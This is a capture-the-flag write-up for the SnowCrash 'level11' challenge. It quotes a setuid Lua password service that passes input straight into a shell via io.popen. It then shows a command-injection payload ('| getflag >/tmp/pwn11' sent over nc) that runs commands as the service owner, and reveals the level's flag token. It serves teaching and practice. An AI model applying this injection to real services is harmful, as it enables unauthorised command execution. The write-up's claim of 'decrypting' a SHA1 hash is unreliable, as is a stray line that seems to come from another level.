# level11

- We log as 'level11'

- A single file is located inside the home directory of level11:
>`-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua`

- The executable file has setuid & setgid bits permissions

- We `cat` this LUA script:
```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

- We can se that it is a small service running on port 5151 that ask for a password, hash it and compare the hash with a hard coded hash

- We try decrypting the hash `f05d1d066fb246efe0c6f7d095f909a7a0cf34a0`

- After decryption in a SHA1 decode we have "NotSoEasy" so maybe this is not the password we look for

- Upon execution with `token` as first argument and `test` as second argument, the executable prints:
>`You don't have access to token`

- We can see that a shell command is executed by the script:
>`prog = io.popen("echo "..pass.." | sha1sum", "r")`

- This line is vulnerable to arbitrary code execution because the arguments of the script are not protected or parsed.

- Lets inject the code into the service:
>`nc 127.0.0.1 5151`
>`Password: | getflag >/tmp/pwn11`
>`Erf nope..`

- Let's `cat` the output file:
>`level11@SnowCrash:~$ cat /tmp/pwn11`
>`Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s`

- We get the flag: `fa6v5ateaw21peobuub8ipe6s`